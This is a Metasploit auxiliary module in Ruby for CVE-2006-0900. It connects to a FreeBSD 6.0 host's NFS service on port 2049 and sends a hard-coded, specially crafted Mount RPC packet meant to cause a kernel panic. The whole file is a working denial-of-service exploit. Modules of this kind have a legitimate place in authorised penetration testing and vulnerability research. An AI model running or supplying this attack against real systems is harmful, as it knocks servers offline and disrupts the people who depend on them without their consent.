require 'msf/core'

module Msf

class Auxiliary::Dos::Freebsd::Nfsd::Nfs_Mount < Msf::Auxiliary

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'FreeBSD Remote NFS RPC Request Denial of Service',
			'Description'    => %q{
				This module sends a specially-crafted NFS Mount request causing a 
				kernel panic on host running FreeBSD 6.0.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 3983 $',
			'References'     =>
				[
					[ 'URL', 'http://lists.immunitysec.com/pipermail/dailydave/2006-February/002982.html' ],
					[ 'BID', '16838' ],
					[ 'CVE', '2006-0900' ],
				]))
			
			register_options([Opt::RPORT(2049),], self.class)
	end

	def run
		connect

		pkt =  "\x80\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02"
		pkt << "\x00\x01\x86\xa5\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00"
		pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04"
	
		print_status("Sending dos packet...")
		
		sock.put(pkt)
		
		disconnect
	end

end
end	
